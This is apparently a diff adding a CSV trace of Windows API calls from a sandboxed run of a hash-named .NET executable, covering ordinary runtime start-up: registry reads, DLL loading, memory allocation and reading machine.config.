@@ -1,0 +1,1429 @@
+api,arguments,return_value,time
+NtCreateMutant,0##0x00000028#0x001f0001,0,1542888185.406625
+GetSystemTimeAsFileTime,,0,1542888185.406625
+NtOpenKey,0x0000002c#0x02000000#HKEY_LOCAL_MACHINE,0,1542888185.406625
+NtOpenKeyEx,0x00000000#0x00020019#0#HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Diagnostics,3221225524,1542888185.406625
+LdrLoadDll,0#ADVAPI32.dll#0#ADVAPI32#0x77730000,0,1542888185.406625
+LdrGetProcedureAddress,RegOpenKeyExW#ADVAPI32#0x7774468d#0#0x77730000,0,1542888185.406625
+RegOpenKeyExW,0x00000034#Software\Microsoft\.NETFramework\Policy\#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\.NETFramework\Policy\#0x80000002#0,0,1542888185.406625
+LdrGetProcedureAddress,RegQueryInfoKeyW#ADVAPI32#0x777446e7#0#0x77730000,0,1542888185.406625
+RegQueryInfoKeyW,0#0x00000034#5#9#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\Policy#0##0#0,0,1542888185.406625
+LdrGetProcedureAddress,RegEnumKeyExW#ADVAPI32#0x777446c8#0#0x77730000,0,1542888185.406625
+RegEnumKeyExW,#4#v4.0#0x00000034#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\Policy,0,1542888185.406625
+RegEnumKeyExW,#3#v2.0#0x00000034#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\Policy,0,1542888185.406625
+RegEnumKeyExW,#2#Upgrades#0x00000034#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\Policy,0,1542888185.406625
+RegEnumKeyExW,#1#Standards#0x00000034#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\Policy,0,1542888185.406625
+RegEnumKeyExW,#0#AppPatch#0x00000034#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\Policy,0,1542888185.406625
+RegOpenKeyExW,0x00000038#v4.0#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\Policy\v4.0#0x00000034#0,0,1542888185.406625
+RegQueryInfoKeyW,1#0x00000038#0#0#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\Policy\v4.0#0##24#5,0,1542888185.406625
+LdrGetProcedureAddress,RegEnumValueW#ADVAPI32#0x777448cc#0#0x77730000,0,1542888185.406625
+RegEnumValueW,|0#30319#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\Policy\v4.0\,,,,ଌ#0x00000038#1#30319-30319|,0,1542888185.406625
+LdrGetProcedureAddress,RegCloseKey#ADVAPI32#0x7774469d#0#0x77730000,0,1542888185.406625
+RegCloseKey,0x00000038,0,1542888185.406625
+GetFileAttributesW,4294967295#C:\Windows\SYSTEM32\MSCOREE.DLL.local#C:\Windows\System32\MSCOREE.DLL.local,4294967295,1542888185.406625
+RegOpenKeyExW,0x00000038#Software\Microsoft\.NETFramework#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\.NETFramework#0x80000002#0,0,1542888185.406625
+LdrGetProcedureAddress,RegQueryValueExW#ADVAPI32#0x777446ad#0#0x77730000,0,1542888185.406625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\InstallRoot#0x00000038#InstallRoot#1#,0,1542888185.406625
+LdrGetProcedureAddress,RegQueryValueExW#ADVAPI32#0x777446ad#0#0x77730000,0,1542888185.406625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\InstallRoot#0x00000038#InstallRoot#1#C:\Windows\Microsoft.NET\Framework\,0,1542888185.406625
+RegCloseKey,0x00000038,0,1542888185.406625
+FindFirstFileExW,C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscoreei.dll#C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscoreei.dll,4585360,1542888185.406625
+NtClose,0x00000038,0,1542888185.406625
+RegCloseKey,0x00000034,0,1542888185.406625
+RegOpenKeyExW,0x00000034#Software\Microsoft\.NETFramework#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\.NETFramework#0x80000002#0,0,1542888185.406625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\InstallRoot#0x00000034#InstallRoot#1#,0,1542888185.406625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\InstallRoot#0x00000034#InstallRoot#1#C:\Windows\Microsoft.NET\Framework\,0,1542888185.406625
+RegCloseKey,0x00000034,0,1542888185.406625
+FindFirstFileExW,C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscoreei.dll#C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscoreei.dll,4585344,1542888185.406625
+NtClose,0x00000034,0,1542888185.406625
+RegOpenKeyExW,0x00000034#Software\Microsoft\.NETFramework#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\.NETFramework#0x80000002#0,0,1542888185.406625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\InstallRoot#0x00000034#InstallRoot#1#,0,1542888185.406625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\InstallRoot#0x00000034#InstallRoot#1#C:\Windows\Microsoft.NET\Framework\,0,1542888185.406625
+RegCloseKey,0x00000034,0,1542888185.406625
+NtAllocateVirtualMemory,0#0#1776#131072#0xffffffff#0x002f0000#8192#4#0,0,1542888185.406625
+NtFreeVirtualMemory,65536#32768#1776#0x002f0000#0xffffffff,0,1542888185.406625
+NtAllocateVirtualMemory,0#0#1776#4096#0xffffffff#0x00300000#4096#4#0,0,1542888185.406625
+LdrGetDllHandle,0#KERNEL32.DLL#0x760b0000,0,1542888185.406625
+LdrGetProcedureAddress,FlsAlloc#KERNEL32#0x760ff189#0#0x760b0000,0,1542888185.406625
+LdrGetProcedureAddress,FlsGetValue#KERNEL32#0x76106c4f#0#0x760b0000,0,1542888185.406625
+LdrGetProcedureAddress,FlsSetValue#KERNEL32#0x76106c67#0#0x760b0000,0,1542888185.406625
+LdrGetProcedureAddress,FlsFree#KERNEL32#0x7610b7c5#0#0x760b0000,0,1542888185.406625
+LdrGetDllHandle,0#KERNEL32.DLL#0x760b0000,0,1542888185.406625
+NtAllocateVirtualMemory,0#0#1776#4096#0xffffffff#0x00301000#4096#4#0,0,1542888185.406625
+NtAllocateVirtualMemory,0#0#1776#4096#0xffffffff#0x00302000#4096#4#0,0,1542888185.406625
+LdrGetDllHandle,0#mscoree.dll#0x72a90000,0,1542888185.406625
+NtCreateMutant,0##0x00000034#0x001f0001,0,1542888185.406625
+GetSystemInfo,1,0,1542888185.406625
+GlobalMemoryStatus,,20250752,1542888185.406625
+LdrGetProcedureAddress,#MSCOREE#0x72aa4c4d#142#0x72a90000,0,1542888185.406625
+NtAllocateVirtualMemory,0#0#1776#1638400#0xffffffff#0x00550000#8192#64#0,0,1542888185.406625
+NtFreeVirtualMemory,1376256#32768#1776#0x00550000#0xffffffff,0,1542888185.406625
+NtAllocateVirtualMemory,1#0#1776#4096#0xffffffff#0x006a0000#4096#64#0,0,1542888185.406625
+LdrLoadDll,0#ADVAPI32.dll#0#ADVAPI32#0x77730000,0,1542888185.406625
+LdrGetProcedureAddress,RegOpenKeyExW#ADVAPI32#0x7774468d#0#0x77730000,0,1542888185.406625
+RegOpenKeyExW,0x00000038#Software\Microsoft\.NETFramework#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\.NETFramework#0x80000002#0,0,1542888185.406625
+LdrGetProcedureAddress,RegQueryValueExW#ADVAPI32#0x777446ad#0#0x77730000,0,1542888185.406625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\CLRLoadLogDir#0x00000038#CLRLoadLogDir#0#,2,1542888185.406625
+LdrGetProcedureAddress,RegCloseKey#ADVAPI32#0x7774469d#0#0x77730000,0,1542888185.406625
+RegCloseKey,0x00000038,0,1542888185.406625
+LdrLoadDll,0#C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscoreei.dll#0#mscoreei#0x6a620000,0,1542888185.406625
+LdrGetProcedureAddress,RegisterShimImplCallback#mscoreei#0x6a626975#0#0x6a620000,0,1542888185.406625
+LdrGetProcedureAddress,RegisterShimImplCleanupCallback#mscoreei#0x72a97eb0#0#0x6a620000,3221225785,1542888185.406625
+LdrGetProcedureAddress,SetShellShimInstance#mscoreei#0x72a9c90c#0#0x6a620000,3221225785,1542888185.406625
+LdrGetProcedureAddress,OnShimDllMainCalled#mscoreei#0x6a6243ef#0#0x6a620000,0,1542888185.406625
+LdrGetProcedureAddress,_CorExeMain_RetAddr#mscoreei#0x72a9c964#0#0x6a620000,3221225785,1542888185.406625
+LdrGetProcedureAddress,_CorExeMain#mscoreei#0x6a625573#0#0x6a620000,0,1542888185.406625
+GetFileAttributesW,4294967295#C:\Windows\SYSTEM32\MSCOREE.DLL.local#C:\Windows\System32\MSCOREE.DLL.local,4294967295,1542888185.406625
+RegOpenKeyExW,0x00000038#Software\Microsoft\.NETFramework#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\.NETFramework#0x80000002#0,0,1542888185.406625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\InstallRoot#0x00000038#InstallRoot#1#,0,1542888185.406625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\InstallRoot#0x00000038#InstallRoot#1#C:\Windows\Microsoft.NET\Framework\,0,1542888185.406625
+RegCloseKey,0x00000038,0,1542888185.406625
+FindFirstFileExW,C:\Windows\Microsoft.NET\Framework\*#C:\Windows\Microsoft.NET\Framework\\*,4588576,1542888185.406625
+NtQueryDirectoryFile,0x00000038#C:\Windows\Microsoft.NET\Framework#3,0,1542888185.406625
+NtCreateFile,0#1#7#2144#4294967295#0x00000000#0x00120080#\??\C:\Windows\Microsoft.NET\Framework\v1.0.3705\clr.dll#C:\Windows\Microsoft.NET\Framework\v1.0.3705\clr.dll,3221225524,1542888185.406625
+NtCreateFile,0#1#7#2144#4294967295#0x00000000#0x00120080#\??\C:\Windows\Microsoft.NET\Framework\v1.0.3705\mscorwks.dll#C:\Windows\Microsoft.NET\Framework\v1.0.3705\mscorwks.dll,3221225524,1542888185.406625
+NtCreateFile,0#1#7#2144#4294967295#0x00000000#0x00120080#\??\C:\Windows\Microsoft.NET\Framework\v1.1.4322\clr.dll#C:\Windows\Microsoft.NET\Framework\v1.1.4322\clr.dll,3221225524,1542888185.406625
+NtCreateFile,0#1#7#2144#4294967295#0x00000000#0x00120080#\??\C:\Windows\Microsoft.NET\Framework\v1.1.4322\mscorwks.dll#C:\Windows\Microsoft.NET\Framework\v1.1.4322\mscorwks.dll,3221225524,1542888185.406625
+NtCreateFile,0#1#7#2144#4294967295#0x00000000#0x00120080#\??\C:\Windows\Microsoft.NET\Framework\v2.0.50727\clr.dll#C:\Windows\Microsoft.NET\Framework\v2.0.50727\clr.dll,3221225524,1542888185.406625
+NtCreateFile,0#1#7#2144#1#0x0000003c#0x00120080#\??\C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorwks.dll#C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorwks.dll,0,1542888185.406625
+NtClose,0x0000003c,0,1542888185.406625
+NtCreateFile,0#1#7#2144#1#0x0000003c#0x00120080#\??\C:\Windows\Microsoft.NET\Framework\v4.0.30319\clr.dll#C:\Windows\Microsoft.NET\Framework\v4.0.30319\clr.dll,0,1542888185.406625
+NtClose,0x0000003c,0,1542888185.406625
+NtQueryDirectoryFile,0x00000038#C:\Windows\Microsoft.NET\Framework#3,2147483654,1542888185.406625
+NtClose,0x00000038,0,1542888185.406625
+NtQuerySystemInformation,0,0,1542888185.453625
+GetSystemDirectoryW,C:\Windows\system32,19,1542888185.453625
+LdrGetDllHandle,0#C:\Windows\system32\IMM32.DLL#0x00000000,3221225781,1542888185.453625
+LdrGetDllHandle,0#C:\Windows\system32\IMM32.DLL#0x00000000,3221225781,1542888185.453625
+LdrLoadDll,0#C:\Windows\system32\IMM32.DLL#0#IMM32#0x777d0000,0,1542888185.453625
+GetSystemDirectoryW,C:\Windows\system32,19,1542888185.453625
+LdrGetDllHandle,0#C:\Windows\system32\IMM32.DLL#0x777d0000,0,1542888185.453625
+NtOpenKey,0x00000000#0x00020019#HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Error Message Instrument\,3221225524,1542888185.453625
+NtOpenKey,0x0000003c#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\GRE_Initialize,0,1542888185.453625
+NtQueryValueKey,0x0000003c##2#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\GRE_Initialize\DisableMetaFiles#0#,3221225524,1542888185.453625
+NtClose,0x0000003c,0,1542888185.453625
+LdrGetDllHandle,0#LPK.DLL#0x77b70000,0,1542888185.453625
+LdrGetProcedureAddress,LpkTabbedTextOut#LPK#0x77b754f3#0#0x77b70000,0,1542888185.453625
+LdrGetProcedureAddress,LpkPSMTextOut#LPK#0x77b74251#0#0x77b70000,0,1542888185.453625
+LdrGetProcedureAddress,LpkDrawTextEx#LPK#0x77b71770#0#0x77b70000,0,1542888185.453625
+LdrGetProcedureAddress,LpkEditControl#LPK#0x77b7706c#0#0x77b70000,0,1542888185.453625
+NtClose,0x00000050,0,1542888185.453625
+NtClose,0x0000004c,0,1542888185.453625
+NtOpenKeyEx,0x0000004c#0x00020019#0#HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows,0,1542888185.453625
+NtQueryValueKey,0x0000004c##2#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs#4#0,0,1542888185.453625
+NtClose,0x0000004c,0,1542888185.453625
+LdrLoadDll,0#gdi32.dll#0#gdi32#0x761f0000,0,1542888185.453625
+LdrGetProcedureAddress,GetCharABCWidthsI#GDI32#0x761fbd76#0#0x761f0000,0,1542888185.453625
+GetSystemTimeAsFileTime,,0,1542888185.453625
+LdrLoadDll,0#SHLWAPI.dll#0#SHLWAPI#0x75fd0000,0,1542888185.468625
+LdrGetProcedureAddress,UrlIsW#SHLWAPI#0x75fe6763#0#0x75fd0000,0,1542888185.468625
+NtCreateFile,128#1#1#96#4294967295#0x00000000#0x80100080#\??\C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe.config#C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe.config,3221225524,1542888185.468625
+RegOpenKeyExW,0x00000054#Software\Microsoft\.NETFramework#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\.NETFramework#0x80000002#0,0,1542888185.468625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\UseLegacyV2RuntimeActivationPolicyDefaultValue#0x00000054#UseLegacyV2RuntimeActivationPolicyDefaultValue#0#,2,1542888185.468625
+RegCloseKey,0x00000054,0,1542888185.468625
+RegOpenKeyExW,0x00000054#Software\Microsoft\.NETFramework#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\.NETFramework#0x80000002#0,0,1542888185.468625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\OnlyUseLatestCLR#0x00000054#OnlyUseLatestCLR#0#,2,1542888185.468625
+RegCloseKey,0x00000054,0,1542888185.468625
+NtCreateFile,0#1#1#100#1#0x00000054#0x80100080#\??\C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe#C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe,0,1542888185.468625
+GetFileSize,0x00000054#6656,6656,1542888185.468625
+NtCreateSection,2#0x00000058#0x00000000#0x00000054#0x000f0005#,0,1542888185.468625
+NtMapViewOfSection,0#0#1776#8192#0xffffffff#0x00000058#0x00400000##0#2,0,1542888185.468625
+GetSystemInfo,1,0,1542888185.468625
+NtClose,0x00000054,0,1542888185.468625
+NtUnmapViewOfSection,1776#8192#0xffffffff#0x00400000,0,1542888185.468625
+NtClose,0x00000058,0,1542888185.468625
+NtCreateFile,0#1#1#100#1#0x00000058#0x80100080#\??\C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe#C:\Users\mag\AppData\Local\Temp\493c233a99eaa2f92a1534a04795af59089c6fafbef6df0eecd5bd634c4c05eb.exe,0,1542888185.468625
+GetFileSize,0x00000058#6656,6656,1542888185.468625
+NtCreateSection,2#0x00000054#0x00000000#0x00000058#0x000f0005#,0,1542888185.468625
+NtMapViewOfSection,0#0#1776#8192#0xffffffff#0x00000054#0x00400000##0#2,0,1542888185.468625
+GetSystemInfo,1,0,1542888185.468625
+NtClose,0x00000058,0,1542888185.468625
+NtUnmapViewOfSection,1776#8192#0xffffffff#0x00400000,0,1542888185.468625
+NtClose,0x00000054,0,1542888185.468625
+RegOpenKeyExW,0x00000000#Software\Microsoft\.NETFramework\Policy\Standards#0x00020019#HKEY_CURRENT_USER\Software\Microsoft\.NETFramework\Policy\Standards#0x80000001#0,2,1542888185.468625
+RegOpenKeyExW,0x00000058#Software\Microsoft\.NETFramework\Policy\Standards#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\.NETFramework\Policy\Standards#0x80000002#0,0,1542888185.468625
+RegOpenKeyExW,0x00000000#v4.0.30319#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\Policy\Standards\v4.0.30319#0x00000058#0,2,1542888185.468625
+RegCloseKey,0x00000058,0,1542888185.468625
+RegOpenKeyExW,0x00000058#SOFTWARE\Microsoft\Fusion#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion#0x80000002#0,0,1542888185.468625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Fusion\NoClientChecks#0x00000058#NoClientChecks#0#,2,1542888185.468625
+RegCloseKey,0x00000058,0,1542888185.468625
+RegOpenKeyExW,0x00000058#Software\Microsoft\.NETFramework\v4.0.30319\SKUs\#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\.NETFramework\v4.0.30319\SKUs\#0x80000002#0,0,1542888185.468625
+RegOpenKeyExW,0x0000005c#default#0x00020019#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v4.0.30319\SKUs\default#0x00000058#0,0,1542888185.468625
+RegCloseKey,0x0000005c,0,1542888185.468625
+RegCloseKey,0x00000058,0,1542888185.468625
+NtCreateFile,0#1#7#2144#1#0x00000058#0x00120080#\??\C:\Windows\Microsoft.NET\Framework\v4.0.30319\clr.dll#C:\Windows\Microsoft.NET\Framework\v4.0.30319\clr.dll,0,1542888185.468625
+NtClose,0x00000058,0,1542888185.468625
+NtAllocateVirtualMemory,0#0#1776#1179648#0xffffffff#0x01360000#8192#4#0,0,1542888185.468625
+NtFreeVirtualMemory,1114112#32768#1776#0x01360000#0xffffffff,0,1542888185.468625
+NtAllocateVirtualMemory,0#0#1776#4096#0xffffffff#0x01470000#4096#4#0,0,1542888185.468625
+LdrGetDllHandle,0#KERNEL32.DLL#0x760b0000,0,1542888185.468625
+LdrGetProcedureAddress,FlsAlloc#KERNEL32#0x760ff189#0#0x760b0000,0,1542888185.468625
+LdrGetProcedureAddress,FlsGetValue#KERNEL32#0x76106c4f#0#0x760b0000,0,1542888185.468625
+LdrGetProcedureAddress,FlsSetValue#KERNEL32#0x76106c67#0#0x760b0000,0,1542888185.468625
+LdrGetProcedureAddress,FlsFree#KERNEL32#0x7610b7c5#0#0x760b0000,0,1542888185.468625
+LdrGetDllHandle,0#KERNEL32.DLL#0x760b0000,0,1542888185.468625
+NtAllocateVirtualMemory,0#0#1776#4096#0xffffffff#0x01471000#4096#4#0,0,1542888185.468625
+NtAllocateVirtualMemory,0#0#1776#4096#0xffffffff#0x01472000#4096#4#0,0,1542888185.468625
+GetSystemTimeAsFileTime,,0,1542888185.468625
+NtAllocateVirtualMemory,0#0#1776#2293760#0xffffffff#0x01480000#8192#64#0,0,1542888185.468625
+NtFreeVirtualMemory,2031616#32768#1776#0x01480000#0xffffffff,0,1542888185.468625
+NtAllocateVirtualMemory,1#0#1776#4096#0xffffffff#0x01670000#4096#64#0,0,1542888185.468625
+LdrLoadDll,0#C:\Windows\Microsoft.NET\Framework\v4.0.30319\clr.dll#0#clr#0x69140000,0,1542888185.468625
+GetSystemInfo,1,0,1542888185.468625
+GetSystemInfo,1,0,1542888185.468625
+LdrLoadDll,0#C:\Windows\Microsoft.NET\Framework\v4.0.30319\clr.dll#0#clr#0x69140000,0,1542888185.468625
+LdrGetProcedureAddress,SetRuntimeInfo#clr#0x692ac71d#0#0x69140000,0,1542888185.468625
+LdrGetProcedureAddress,_CorExeMain#clr#0x692aaee4#0#0x69140000,0,1542888185.468625
+GetSystemInfo,1,0,1542888185.468625
+RegOpenKeyExW,0x00000000#Software\Microsoft\.NETFramework#0x00020019#HKEY_CURRENT_USER\Software\Microsoft\.NETFramework#0x80000001#0,2,1542888185.468625
+RegOpenKeyExW,0x00000058#Software\Microsoft\.NETFramework#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\.NETFramework#0x80000002#0,0,1542888185.468625
+RegQueryValueExW,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\DisableConfigCache#0x00000058#DisableConfigCache#0#,2,1542888185.468625
+RegCloseKey,0x00000058,0,1542888185.468625
+RegOpenKeyExW,0x00000000#Software\Microsoft\.NETFramework#0x00020019#HKEY_CURRENT_USER\Software\Microsoft\.NETFramework#0x80000001#0,2,1542888185.468625
+RegOpenKeyExW,0x00000058#Software\Microsoft\.NETFramework#0x00020019#HKEY_LOCAL_MACHINE\Software\Microsoft\.NETFramework#0x80000002#0,0,1542888185.468625
+RegEnumValueW,|0#InstallRoot#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\,#0x00000058#1#|,0,1542888185.468625
+RegEnumValueW,1#InstallRoot#HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\InstallRoot#0x00000058#2147348480#,259,1542888185.468625
+LdrGetDllHandle,0#kernel32.dll#0x760b0000,0,1542888185.468625
+LdrGetProcedureAddress,SetThreadStackGuarantee#KERNEL32#0x760f2de4#0#0x760b0000,0,1542888185.468625
+GetSystemInfo,1,0,1542888185.468625
+NtAllocateVirtualMemory,0#0#1776#8192#0xffffffff#0x002cd000#4096#260#0,0,1542888185.468625
+LdrGetDllHandle,0#advapi32#0x77730000,0,1542888185.468625
+LdrGetProcedureAddress,EventWrite#ADVAPI32#0x77a5d5ba#0#0x77730000,0,1542888185.468625
+LdrGetProcedureAddress,EventRegister#ADVAPI32#0x77a95adc#0#0x77730000,0,1542888185.468625
+LdrGetProcedureAddress,EventUnregister#ADVAPI32#0x77a8d96d#0#0x77730000,0,1542888185.468625
+NtOpenDirectoryObject,\Sessions\1\BaseNamedObjects#0x00000078#0x0000000f#\Sessions\1\BaseNamedObjects,0,1542888185.468625
+NtProtectVirtualMemory,0#0#1776#4096#0xffffffff#0x69141000#64#0,0,1542888185.468625
+NtProtectVirtualMemory,0#0#1776#4096#0xffffffff#0x69141000#32#0,0,1542888185.468625
+SetErrorMode,32769,32775,1542888185.468625
+LdrLoadDll,0#C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscoree.dll#0#mscoree#0x00000000,3221225781,1542888185.468625
+SetErrorMode,32775,32773,1542888185.468625
+LdrLoadDll,0#mscoree.dll#0#mscoree#0x72a90000,0,1542888185.468625
+LdrGetProcedureAddress,CreateConfigStream#MSCOREE#0x72a97dd7#0#0x72a90000,0,1542888185.468625
+LdrGetProcedureAddress,CreateConfigStream_RetAddr#mscoreei#0x72a9cb5c#0#0x6a620000,3221225785,1542888185.468625
+LdrGetProcedureAddress,CreateConfigStream#mscoreei#0x6a624888#0#0x6a620000,0,1542888185.468625
+NtCreateFile,128#1#1#96#1#0x0000007c#0x80100080#\??\C:\Windows\Microsoft.NET\Framework\v4.0.30319\config\machine.config#C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\machine.config,0,1542888185.468625
+NtReadFile,|0#<?xml version="1.0" encoding="UTF-8" ?>
+<!--
+    Please refer to machine.config.comments for a description and
+    the default values of each configuration section.
+
+    For a full documentation of the schema please refer to
+    http://go.microsoft.com/fwlink/?LinkId=42127
+
+    To improve performance, machine.config should contain only those
+    settings that differ from their defaults.
+-->
+<configuration>
+    <configSections>
+        <section name="appSettings" type="System.Configuration.AppSettingsSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" restartOnExternalChanges="false" requirePermission="false" />
+        <section name="connectionStrings" type="System.Configuration.ConnectionStringsSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" requirePermission="false" />
+        <section name="mscorlib" type="System.Configuration.IgnoreSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowLocation="false" />
+        <section name="runtime"  type="System.Configuration.IgnoreSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowLocation="false" />
+        <section name="assemblyBinding"  type="System.Configuration.IgnoreSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowLocation="false" />
+        <section name="satelliteassemblies" type="System.Configuration.IgnoreSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowLocation="false" />
+        <section name="startup"  type="System.Configuration.IgnoreSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowLocation="false" />
+        <section name="system.codedom" type="System.CodeDom.Compiler.CodeDomConfigurationHandler, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        <section name="system.data" type="System.Data.Common.DbProviderFactoriesConfigurationHandler, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        <section name="system.data.dataset" type="System.Configuration.NameValueFileSectionHandler, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" restartOnExternalChanges="false" />
+        <section name="system.data.odbc" type="System.Data.Common.DbProviderConfigurationHandler, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        <section name="system.data.oledb" type="System.Data.Common.DbProviderConfigurationHandler, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        <section name="system.data.oracleclient" type="System.Data.Common.DbProviderConfigurationHandler, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        <section name="system.data.sqlclient" type="System.Data.Common.DbProviderConfigurationHandler, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        <section name="system.diagnostics" type="System.Diagnostics.SystemDiagnosticsSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        <section name="system.runtime.remoting" type="System.Configuration.IgnoreSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowLocation="false" />
+        <section name="system.windows.forms" type="System.Windows.Forms.WindowsFormsSection, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        <section name="windows" type="System.Configuration.IgnoreSection, System.Configuration, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowLocation="false" />
+        <section name="uri" type="System.Configuration.UriSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+        <sectionG#0x0000007c#4095|,0,1542888185.468625
+NtReadFile,|0#roup name="system.runtime.caching" type="System.Runtime.Caching.Configuration.CachingSectionGroup, System.Runtime.Caching, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a">
+            <section name="memoryCache" type="System.Runtime.Caching.Configuration.MemoryCacheSection, System.Runtime.Caching, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" allowDefinition="MachineToApplication" />
+        </sectionGroup>
+        <sectionGroup name="system.xml.serialization" type="System.Xml.Serialization.Configuration.SerializationSectionGroup, System.Xml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
+            <section name="schemaImporterExtensions" type="System.Xml.Serialization.Configuration.SchemaImporterExtensionsSection, System.Xml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+            <section name="dateTimeSerialization" type="System.Xml.Serialization.Configuration.DateTimeSerializationSection, System.Xml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+            <section name="xmlSerializer" type="System.Xml.Serialization.Configuration.XmlSerializerSection, System.Xml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" requirePermission="false" />
+        </sectionGroup>
